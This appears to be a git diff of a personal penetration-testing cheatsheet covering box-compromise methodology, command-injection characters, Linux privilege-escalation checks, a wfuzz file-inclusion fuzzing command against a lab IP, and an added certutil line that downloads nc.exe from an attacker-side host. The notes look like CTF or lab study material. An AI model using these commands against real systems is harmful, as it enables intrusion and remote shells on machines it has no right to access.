@@ -1,8 +1,8 @@
 # My Notes / Cheatsheet
-### Last Updated: 12 Jan 2020
+### Last Updated: 15 Jan 2020
 Notes related to Vuln Assmnt/PenTesting 
 
-#### Approach for Linux
+#### Approach for Compromising a box
 > 1. Identify open ports (**nmap/autorecon/rustscan**), enumerate ports (TCP+UDP) for services.
 > 1. Run **gobuster/wfuzz** and identify DIR and FILES present. Try using 02 diff wordlists. BurpSuite also has crawler. 
 > 1. Run **nikto**, Have you read the source code ? If its a website look whats running ? 
@@ -18,8 +18,8 @@ Notes related to Vuln Assmnt/PenTesting
 > 1. Command Injection - Try Special characters e.g. " ; , | , & , && " etc. ${IFS} is space --- Can help in achieving ComInj. 
 
 #### PrivESC Methodology for Linux
-> 1. Creds file or any misconfiguration file? (**find** command)
-> 1. SUDO commands this user can run ?
+> 1. Creds file or any misconfiguration file? (**find or grep** command)
+> 1. SUDO commands this user can run ? (try running sudo -l) 
 > 1. SUID binaries present (use **find** command or **suid3num python** script)
 > 1. Is there SQL database, try enumerating it ?
 > 1. Running ports / services on this box ? (use **netstat** or **ss** command)
@@ -52,3 +52,7 @@ test-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j
 test-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j7b5fl" -u http
 ://192.168.10.13/bluesky/port.php?file=FUZZ --hw 245 -H "User-Agent:Mozilla/5.0 (X11; Linux x8
 6_64; rv:78.0) Gecko/20100101 Firefox/78.0" -P 127.0.0.1:8080:HTTP
+
+#### Windws Tricks
+##### Download a file in Windows 
+> 1. certutil -urlcache -split -f http://192.168.10.100/nc.exe
